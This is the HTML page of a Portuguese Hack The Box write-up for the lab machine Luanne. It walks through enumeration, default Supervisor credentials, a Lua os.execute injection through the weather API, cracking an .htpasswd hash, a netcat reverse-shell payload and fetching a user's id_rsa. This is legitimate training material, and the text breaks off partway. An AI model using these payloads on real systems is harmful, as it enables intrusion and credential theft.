@@ -1,0 +1,1458 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.21.0 by Michael Rose
+  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Hackthebox write-up: Luanne | Davi Cruz</title>
+<meta name="description" content="Olá pessoal!  A máquina desta semana será Luanne, outra máquina Linux classificada como fácil do Hack The Box, , criada por polarbearer.">
+
+
+  <meta name="author" content="Davi Cruz">
+  
+  <meta property="article:author" content="Davi Cruz">
+  
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Davi Cruz">
+<meta property="og:title" content="Hackthebox write-up: Luanne">
+<meta property="og:url" content="https://davicruz.com/writeup/2021/03/htb-luanne/">
+
+
+  <meta property="og:description" content="Olá pessoal!  A máquina desta semana será Luanne, outra máquina Linux classificada como fácil do Hack The Box, , criada por polarbearer.">
+
+
+
+  <meta property="og:image" content="https://i.imgur.com/8bsXO5e.png">
+
+
+
+  <meta name="twitter:site" content="@zerahzurc">
+  <meta name="twitter:title" content="Hackthebox write-up: Luanne">
+  <meta name="twitter:description" content="Olá pessoal!  A máquina desta semana será Luanne, outra máquina Linux classificada como fácil do Hack The Box, , criada por polarbearer.">
+  <meta name="twitter:domain" content="davicruz.com">
+  <meta name="twitter:url" content="https://davicruz.com/writeup/2021/03/htb-luanne/">
+
+  
+    <meta name="twitter:card" content="summary">
+    
+      <meta name="twitter:image" content="https://i.imgur.com/8bsXO5e.png">
+    
+  
+
+  
+
+
+
+  <meta property="article:published_time" content="2021-03-27T09:00:00-03:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="https://davicruz.com/writeup/2021/03/htb-luanne/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "Davi Cruz",
+      "url": "https://davicruz.com/",
+      "sameAs": ["https://twitter.com/zerahzurc","https://www.linkedin.com/in/davicruz","https://github.com/davi-cruz"]
+    
+  }
+</script>
+
+
+  <meta name="google-site-verification" content="hrWV-PqvbpxEy2HdpVYFQNws2Sz_tROleVyF18s2kWA" />
+
+
+  <meta name="msvalidate.01" content="60B1FA6CDAF15D226AB529AF30386BD8">
+
+
+
+  <meta name="yandex-verification" content="08de8d8c0326420f">
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Davi Cruz Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css">
+
+<!--[if IE]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+<!-- Favicon -->
+<link rel="shortcut icon" href="/assets/images/favicon.ico" />
+
+<!-- Multilang tags -->
+
+    
+<link rel="alternate" hreflang="pt-BR" href="/writeup/2021/03/htb-luanne/">
+    
+
+    
+<link rel="alternate" hreflang="en-US" href="/en-US/writeup/2021/03/htb-luanne/">
+    
+
+
+<!-- Cookie Consent - Osano -->
+<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/cookieconsent@3/build/cookieconsent.min.css" />
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+    <nav class="skip-links">
+  <h2 class="screen-reader-text">Skip links</h2>
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          
+          <a class="site-logo" href="https://davicruz.com"><img src="/assets/images/logo.png" alt="Davi Cruz"></a>
+          
+          <a class="site-title" href="https://davicruz.com">
+            Davi Cruz
+            
+          </a>
+        
+        <ul class="visible-links">
+<li class="masthead__menu-item">
+            <a href="/categorias/">Categorias</a>
+          </li>
+<li class="masthead__menu-item">
+            <a href="/tags/">Tags</a>
+          </li>
+<li class="masthead__menu-item">
+            <a href="/sobre/">Sobre</a>
+          </li>
+</ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Buscar</span>
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+        <img src="/assets/images/bio-photo.jpg" alt="Davi Cruz" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">Davi Cruz</h3>
+    
+    
+      <div class="author__bio" itemprop="description">
+        <p>Apenas mais um profissional de Cibersegurança</p>
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Acompanhe no</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">São Paulo, BR</span>
+        </li>
+      
+
+      
+        
+          
+            <li><a href="https://linkedin.com/in/davicruz" rel="nofollow noopener noreferrer"><i class="fab fa-fw fab fa-linkedin" aria-hidden="true"></i><span class="label">Linkedin</span></a></li>
+          
+        
+          
+            <li><a href="https://twitter.com/zerahzurc" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
+          
+        
+          
+            <li><a href="https://github.com/davi-cruz" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+<li>
+  <strong></strong>
+  
+  <a class="link-en" href=""></a>
+  
+</li>
+
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Hackthebox write-up: Luanne">
+    <meta itemprop="description" content="Olá pessoal!A máquina desta semana será Luanne, outra máquina Linux classificada como fácil do Hack The Box, , criada por polarbearer.">
+    <meta itemprop="datePublished" content="2021-03-27T09:00:00-03:00">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Hackthebox write-up: Luanne
+</h1>
+          
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-calendar-alt" aria-hidden="true"></i>
+        <time datetime="2021-03-27T09:00:00-03:00">March 27, 2021</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          11 minuto(s) de leitura
+        
+      </span>
+    
+
+
+      <!-- Start Read in other languages-->
+        <span class="page__meta-sep page__meta-lang"></span>
+        
+        
+        
+        
+        
+        <span class="page__meta-lang"><a href="/en-US/writeup/2021/03/htb-luanne/">Read also in  <img class="emoji" title=":us:" alt=":us:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1fa-1f1f8.png" height="20" width="20"></a></span>
+        
+
+        
+
+        
+
+        
+        
+      <!-- End Read in other languages-->
+      <span class="page__meta-sep page__meta-share"></span>
+      <span class="page__meta-share">
+        <i class="fas fa-share-alt" aria-hidden="true"></i>
+        <a href="#sharelinks">Compartilhar</a>
+      </span>
+  </p>
+
+
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p>Olá pessoal!</p>
+
+<p>A máquina desta semana será <strong>Luanne</strong>, outra máquina Linux classificada como fácil do <a href="https://www.hackthebox.eu">Hack The Box</a>, , criada por <a href="https://app.hackthebox.eu/users/159204">polarbearer</a>.<!--more--></p>
+
+<p class="notice--info"><img class="emoji" title=":information_source:" alt=":information_source:" src="https://github.githubassets.com/images/icons/emoji/unicode/2139.png" height="20" width="20"> <strong>Info</strong>: Write-ups para máquinas do Hack The Box são postados assim que as respectivas máquinas são aposentadas</p>
+
+<p><img src="https://i.imgur.com/H8PyuHc.png" alt="HTB Luanne" class="align-center"></p>
+
+<h2 id="enumeração">Enumeração</h2>
+
+<p>Iniciado enumeração, como de costume, executando um scan rápido com o <code class="language-plaintext highlighter-rouge">nmap</code> para identificar os serviços publicados:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-Pn</span> <span class="nt">-oA</span> quick 10.10.10.218
+Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>will be slower.
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-02-19 13:35 <span class="nt">-03</span>
+Nmap scan report <span class="k">for </span>10.10.10.218
+Host is up <span class="o">(</span>0.15s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 997 closed ports
+PORT STATE SERVICE VERSION
+22/tcp open ssh OpenSSH 8.0 <span class="o">(</span>NetBSD 20190418-hpn13v14-lpk<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey:
+| 3072 20:97:7f:6c:4a:6e:5d:20:cf:fd:a3:aa:a9:0d:37:db <span class="o">(</span>RSA<span class="o">)</span>
+| 521 35:c3:29:e1:87:70:6d:73:74:b2:a9:a2:04:a9:66:69 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_ 256 b3:bd:31:6d:cc:22:6b:18:ed:27:66:b4:a7:2a:e4:a5 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open http nginx 1.19.0
+| http-auth:
+| HTTP/1.1 401 Unauthorized<span class="se">\x</span>0D
+|_ Basic <span class="nv">realm</span><span class="o">=</span><span class="nb">.</span>
+| http-robots.txt: 1 disallowed entry
+|_/weather
+|_http-server-header: nginx/1.19.0
+|_http-title: 401 Unauthorized
+9001/tcp open http Medusa httpd 1.12 <span class="o">(</span>Supervisor process manager<span class="o">)</span>
+| http-auth:
+| HTTP/1.1 401 Unauthorized<span class="se">\x</span>0D
+|_ Basic <span class="nv">realm</span><span class="o">=</span>default
+|_http-server-header: Medusa/1.12
+|_http-title: Error response
+Service Info: OS: NetBSD<span class="p">;</span> CPE: cpe:/o:netbsd:netbsd
+  
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>208.02 seconds
+</code></pre></div></div>
+
+<h2 id="80tcp---serviço-http">80/TCP - Serviço HTTP</h2>
+
+<p>Ao acessar a página inicial do serviço foi solicitada autenticação, para a qual não temos nenhum tipo de credencial até o momento. Um ponto que chama a atenção é o link para a porta 3000/TCP do localhost, sendo que estamos acessando de uma porta 80/TCP, provavelmente através de um proxy.</p>
+
+<p><img src="https://i.imgur.com/29kTezx.png" alt="HTB Luanne - 3000/TCP" class="align-center"></p>
+
+<p>De acordo com o scan do <code class="language-plaintext highlighter-rouge">nmap</code>, existe uma entrada no arquivo <code class="language-plaintext highlighter-rouge">robots.txt</code>. Ao validá-lo integralmente encontramos uma informação importante sobre um diretório virtual <code class="language-plaintext highlighter-rouge">/weather</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">-L</span> http://10.10.10.218/robots.txt
+User-agent: <span class="k">*</span>
+Disallow: /weather <span class="c">#returning 404 but still harvesting cities</span>
+</code></pre></div></div>
+
+<p>Com este dado podemos inferir que, mesmo com os errors 404, ainda deve existir algum serviço onde possamos realizar as consultas a respeito do tempo.</p>
+
+<h3 id="gobuster">Gobuster</h3>
+
+<p>Executando o <code class="language-plaintext highlighter-rouge">gobuster</code> em modo diretório, pude identificar o caminho <strong>forecast</strong>, que foi chave para conseguirmos prosseguir nesta máquina:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-u</span> http://10.10.10.218/weather/ <span class="nt">-o</span> gosbuter-80-weather.txt <span class="nt">-t</span> 50
+<span class="o">===============================================================</span>
+Gobuster v3.0.1
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url: http://10.10.10.218/weather/
+<span class="o">[</span>+] Threads: 50
+<span class="o">[</span>+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+<span class="o">[</span>+] Status codes: 200,204,301,302,307,401,403
+<span class="o">[</span>+] User Agent: gobuster/3.0.1
+<span class="o">[</span>+] Timeout: 10s
+<span class="o">===============================================================</span>
+2021/02/19 14:50:37 Starting gobuster
+<span class="o">===============================================================</span>
+/forecast <span class="o">(</span>Status: 200<span class="o">)</span>
+Progress: 68993 / 220561 <span class="o">(</span>31.28%<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Em uma chamada utilizando o <code class="language-plaintext highlighter-rouge">curl</code> faltando parámetros, recebemos um “manual” de como utilizar a API, onde temos a opção de listar o clima pra cidades específicas implementadas.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">-L</span> http://10.10.10.218/weather/forecast
+<span class="o">{</span><span class="s2">"code"</span>: 200, <span class="s2">"message"</span>: <span class="s2">"No city specified. Use 'city=list' to list available cities."</span><span class="o">}</span>
+<span class="nv">$ </span>curl <span class="nt">-L</span> http://10.10.10.218/weather/forecast?city<span class="o">=</span>list
+<span class="o">{</span><span class="s2">"code"</span>: 200,<span class="s2">"cities"</span>: <span class="o">[</span><span class="s2">"London"</span>,<span class="s2">"Manchester"</span>,<span class="s2">"Birmingham"</span>,<span class="s2">"Leeds"</span>,<span class="s2">"Glasgow"</span>,<span class="s2">"Southampton"</span>,<span class="s2">"Liverpool"</span>,<span class="s2">"Newcastle"</span>,<span class="s2">"Nottingham"</span>,<span class="s2">"Sheffield"</span>,<span class="s2">"Bristol"</span>,<span class="s2">"Belfast"</span>,<span class="s2">"Leicester"</span><span class="o">]}</span>
+  
+<span class="nv">$ </span>curl <span class="nt">-L</span> http://10.10.10.218/weather/forecast?city<span class="o">=</span>London
+<span class="o">{</span><span class="s2">"code"</span>: 200,<span class="s2">"city"</span>: <span class="s2">"London"</span>,<span class="s2">"list"</span>: <span class="o">[{</span><span class="s2">"date"</span>: <span class="s2">"2021-02-19"</span>,<span class="s2">"weather"</span>: <span class="o">{</span><span class="s2">"description"</span>: <span class="s2">"snowy"</span>,<span class="s2">"temperature"</span>: <span class="o">{</span><span class="s2">"min"</span>: <span class="s2">"12"</span>,<span class="s2">"max"</span>: <span class="s2">"46"</span><span class="o">}</span>,<span class="s2">"pressure"</span>: <span class="s2">"1799"</span>,<span class="s2">"humidity"</span>: <span class="s2">"92"</span>,<span class="s2">"wind"</span>: <span class="o">{</span><span class="s2">"speed"</span>: <span class="s2">"2.1975513692014"</span>,<span class="s2">"degree"</span>: <span class="s2">"102.76822959445"</span><span class="o">}}}</span>,<span class="o">{</span><span class="s2">"date"</span>: <span class="s2">"2021-02-20"</span>,<span class="s2">"weather"</span>: <span class="o">{</span><span class="s2">"description"</span>: <span class="s2">"partially cloudy"</span>,<span class="s2">"temperature"</span>: <span class="o">{</span><span class="s2">"min"</span>: <span class="s2">"15"</span>,<span class="s2">"max"</span>: <span class="s2">"43"</span><span class="o">}</span>,<span class="s2">"pressure"</span>: <span class="s2">"1365"</span>,<span class="s2">"humidity"</span>: <span class="s2">"51"</span>,<span class="s2">"wind"</span>: <span class="o">{</span><span class="s2">"speed"</span>: <span class="s2">"4.9522297247313"</span>,<span class="s2">"degree"</span>: <span class="s2">"262.63571172766"</span><span class="o">}}}</span>,<span class="o">{</span><span class="s2">"date"</span>: <span class="s2">"2021-02-21"</span>,<span class="s2">"weather"</span>: <span class="o">{</span><span class="s2">"description"</span>: <span class="s2">"sunny"</span>,<span class="s2">"temperature"</span>: <span class="o">{</span><span class="s2">"min"</span>: <span class="s2">"19"</span>,<span class="s2">"max"</span>: <span class="s2">"30"</span><span class="o">}</span>,<span class="s2">"pressure"</span>: <span class="s2">"1243"</span>,<span class="s2">"humidity"</span>: <span class="s2">"13"</span>,<span class="s2">"wind"</span>: <span class="o">{</span><span class="s2">"speed"</span>: <span class="s2">"1.8041767538525"</span>,<span class="s2">"degree"</span>: <span class="s2">"48.400944394059"</span><span class="o">}}}</span>,<span class="o">{</span><span class="s2">"date"</span>: <span class="s2">"2021-02-22"</span>,<span class="s2">"weather"</span>: <span class="o">{</span><span class="s2">"description"</span>: <span class="s2">"sunny"</span>,<span class="s2">"temperature"</span>: <span class="o">{</span><span class="s2">"min"</span>: <span class="s2">"30"</span>,<span class="s2">"max"</span>: <span class="s2">"34"</span><span class="o">}</span>,<span class="s2">"pressure"</span>: <span class="s2">"1513"</span>,<span class="s2">"humidity"</span>: <span class="s2">"84"</span>,<span class="s2">"wind"</span>: <span class="o">{</span><span class="s2">"speed"</span>: <span class="s2">"2.6126398323104"</span>,<span class="s2">"degree"</span>: <span class="s2">"191.63755226741"</span><span class="o">}}}</span>,<span class="o">{</span><span class="s2">"date"</span>: <span class="s2">"2021-02-23"</span>,<span class="s2">"weather"</span>: <span class="o">{</span><span class="s2">"description"</span>: <span class="s2">"partially cloudy"</span>,<span class="s2">"temperature"</span>: <span class="o">{</span><span class="s2">"min"</span>: <span class="s2">"30"</span>,<span class="s2">"max"</span>: <span class="s2">"36"</span><span class="o">}</span>,<span class="s2">"pressure"</span>: <span class="s2">"1772"</span>,<span class="s2">"humidity"</span>: <span class="s2">"53"</span>,<span class="s2">"wind"</span>: <span class="o">{</span><span class="s2">"speed"</span>: <span class="s2">"2.7699138359167"</span>,<span class="s2">"degree"</span>: <span class="s2">"104.89152945159"</span><span class="o">}}}]}</span>
+</code></pre></div></div>
+
+<p>Embora seja possível consultar as informações nesta API, não consegui identificar nenhum detalhe adicional de como converter essa API de consulta para alguma execução remota de código e decidi seguir para o próximo serviço disponível nesta máquina.</p>
+
+<h3 id="9001tcp---serviço-http">9001/TCP - Serviço HTTP</h3>
+
+<p>Buscando por <code class="language-plaintext highlighter-rouge">Medusa httpd 1.12 (Supervisor process manager)</code> encontrei que o serviço provavelmente se trata da aplicação <a href="https://github.com/Supervisor/supervisor"><strong>Supervisor</strong></a>. Buscando pelas credenciais padrão na página do projeto encontrei <strong>user:123</strong>, as quais permitiram o acesso no portal e exibiu a página abaixo:</p>
+
+<p><img src="https://i.imgur.com/2fSp0Lx.png" alt="HTB Luanne - Supervisor" class="align-center"></p>
+
+<p>Com isso podemos observar que a versão do supervisor em execução é  a <strong>4.2.0</strong>, que em uma busca rápida não retornou nenhuma vulnerabilidade conhecida.</p>
+
+<p>Clicando em cada um dos recursos disponíveis, um item interessante chamou atenção: o link <strong>processes</strong>. Ao acessar as informações ali disponíveis um processo em execução na máquina chamou atenção, frente ao que identificamos no item anterior:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>_httpd 376 0.0 0.0 34956 2020 ? Is 5:56AM 0:00.13 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3000 -L weather /usr/local/webapi/weather.lua -U _httpd -b /var/www
+</code></pre></div></div>
+
+<p>Pelo que pudemos identificar a API que estivemos consultando a pouco publicada na porta 80/TCP se trata de um aplicativo desenvolvido em <a href="https://www.lua.org/start.html">LUA</a>, uma linguagem de programação desenvolvida pela Universidade PUC-RJ.</p>
+
+<h2 id="acesso-inicial">Acesso inicial</h2>
+
+<p>Uma vez que sabemos que a API é desenvolvida em LUA, após algumas pesquisas, encontrei <a href="https://www.syhunt.com/en/index.php?n=Articles.LuaVulnerabilities">este artigo</a> que descreve algumas formas de explorar aplicações escritas em LUA a partir de code injection e, após alguns testes, consegui algo que poderia nos levar a um acesso inicial nesta máquina.</p>
+
+<p class="notice--info"><img class="emoji" title=":bulb:" alt=":bulb:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f4a1.png" height="20" width="20"> <strong>Note</strong>: O segredo está na codificação do conteúdo passado nos requests, logo, a forma mais simples encontrada foi utilizar o próprio <code class="language-plaintext highlighter-rouge">curl</code> com alguns parâmetros conforme listado abaixo, simplificando o processo de <em>escaping</em> dos caracteres utilizados no payload.:</p>
+
+<p>A injeção final, que permitiu execução remota de código na máquina foi o resultado abaixo:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">-G</span> <span class="nt">--data-urlencode</span> <span class="s2">"city=London') os.execute('ls -la') x=('"</span> http://10.10.10.218/weather/forecast
+<span class="o">{</span><span class="s2">"code"</span>: 500,<span class="s2">"error"</span>: <span class="s2">"unknown city: Londontotal 20
+drwxr-xr-x 2 root wheel 512 Nov 25 11:27 .
+drwxr-xr-x 24 root wheel 512 Nov 24 09:55 ..
+-rw-r--r-- 1 root wheel 47 Sep 16 15:07 .htpasswd
+-rw-r--r-- 1 root wheel 386 Sep 17 20:56 index.html
+-rw-r--r-- 1 root wheel 78 Nov 25 11:38 robots.txt
+</span></code></pre></div></div>
+
+<p>A partir desta execução consegui ler o arquivo <code class="language-plaintext highlighter-rouge">.htpasswd</code>, que possui o hash da senha para acesso ao website que, utilizando o <strong>john</strong>, consegui crackeá-la a usando o dicionário <strong>rockyou.txt</strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat</span> .htpasswd
+webapi_user:<span class="nv">$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0</span>
+  
+<span class="nv">$ </span>john <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt <span class="nt">--format</span><span class="o">=</span>md5crypt-long .htpasswd
+Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>md5crypt-long, crypt<span class="o">(</span>3<span class="o">)</span> <span class="nv">$1$ </span><span class="o">(</span>and variants<span class="o">)</span> <span class="o">[</span>MD5 32/64]<span class="o">)</span>
+Will run 2 OpenMP threads
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+iamthebest <span class="o">(</span>webapi_user<span class="o">)</span>
+1g 0:00:00:00 DONE <span class="o">(</span>2021-02-19 17:09<span class="o">)</span> 3.571g/s 10628p/s 10628c/s 10628C/s sexy..14789632
+Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
+Session completed
+</code></pre></div></div>
+
+<p>Para obter um shell reverso, executei a seguinte chamada HTTP:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+curl <span class="nt">-G</span> <span class="nt">--data-urlencode</span> <span class="s2">"city=London') os.execute('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 1234 &gt;/tmp/f') x=('"</span> http://10.10.10.218/weather/forecast
+
+</code></pre></div></div>
+
+<h2 id="user-flag">User flag</h2>
+
+<p>Ao executar o <code class="language-plaintext highlighter-rouge">linpeas.sh</code> observado que o usuário <strong>r.michaels</strong> possui em execução a mesma web API LUA utilizada no acesso inicial. A ideia seria obter um shell reverso com a conta do usuário em questão da mesma forma que o acesso inicial foi obtido, porém a exploração utilizada anteriormente não funcionou conforme esperado. Isso nos leva a crer que esta versão da API foi corrigida, conforme podemos notar também o path <strong>devel</strong> no caminho do arquivo <code class="language-plaintext highlighter-rouge">weather.lua</code> em execução na chamada.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>r.michaels 185 0.0 0.0 34992 1964 ? Is 5:56AM 0:00.00 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3001 -L weather /home/r.michaels/devel/webapi/weather.lua -P /var/run/httpd_devel.pid -U r.michaels
+-b /home/r.michaels/devel/www
+</code></pre></div></div>
+
+<h3 id="bozohttpd">bozohttpd</h3>
+
+<p>Um ponto que estava passando desapercebido até então é que embora acessássemos a aplicação na porta 80/TCP, ela estava publicada na porta 3000/TCP local. Isso implica que algum proxy estava sendo utilizado para a sua publicação. Esta informação foi confirmada ao validar o cabeçalho da resposta recebida em um request diretamente por dentro da máquina:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-I</span> http://127.0.0.1:3000
+% Total % Received % Xferd Average Speed Time Time Time Current
+Dload Upload Total Spent Left Speed
+0 199 0 0 0 0 0 0 <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:-- 0
+HTTP/1.1 401 Unauthorized
+WWW-Authenticate: Basic <span class="nv">realm</span><span class="o">=</span><span class="s2">"."</span>
+Content-Type: text/html
+Content-Length: 199
+Server: bozohttpd/20190228
+Allow: GET, HEAD, POST
+</code></pre></div></div>
+
+<p>Pesquisando sobre o bozohttpd, o servidor utilizado para esta publicação, encontrei esta <a href="https://man.netbsd.org/NetBSD-7.0/bozohttpd.8"><strong>man page</strong></a> que descreve uma das suas features: <em>~user translation</em>, que permite acessar diretórios virtuais dos usuários através de chamada do tipo <code class="language-plaintext highlighter-rouge">http://&lt;server&gt;/~&lt;username&gt;</code>. Iss foi confirmado a partir da seguinte chaada utilizando o <code class="language-plaintext highlighter-rouge">curl</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://127.0.0.1:3000/~r.michaels <span class="nt">-u</span> webapi_user
+Enter host password <span class="k">for </span>user <span class="s1">'webapi_user'</span>:iamthebest
+  
+% Total % Received % Xferd Average Speed Time Time Time Current
+Dload Upload Total Spent Left Speed
+100 172 0 172 0 0 86000 0 <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:-- 86000
+&lt;html&gt;&lt;<span class="nb">head</span><span class="o">&gt;</span>&lt;title&gt;Document Moved&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;&lt;h1&gt;Document Moved&lt;/h1&gt;
+This document had moved &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">"http://127.0.0.1:3000/~r.michaels/"</span><span class="o">&gt;</span>here&lt;/a&gt;
+&lt;/body&gt;&lt;/html&gt;
+</code></pre></div></div>
+
+<p>Entretanto, uma vez que a instância na porta 3000 roda com a conta <code class="language-plaintext highlighter-rouge">_httpd</code>, não temos permissão neste diretório, mas como notamos que existe uma outra instancia na porta 3001 em execução pelo usuário <code class="language-plaintext highlighter-rouge">r.michaels</code>, pudemos obter o seguinte resultado, onde vemos a existência de um aquivo chamado <strong>id_rsa</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://127.0.0.1:3001/~r.michaels/id_rsa <span class="nt">-u</span> webapi_user
+Enter host password <span class="k">for </span>user <span class="s1">'webapi_user'</span>:iamthebest
+
+% Total % Received % Xferd Average Speed Time Time Time Current
+Dload Upload Total Spent Left Speed
+100 601 0 601 0 0 293k 0 <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:-- 586k
+&lt;<span class="o">!</span>DOCTYPE html&gt;
+&lt;html&gt;&lt;<span class="nb">head</span><span class="o">&gt;</span>&lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">"utf-8"</span>/&gt;
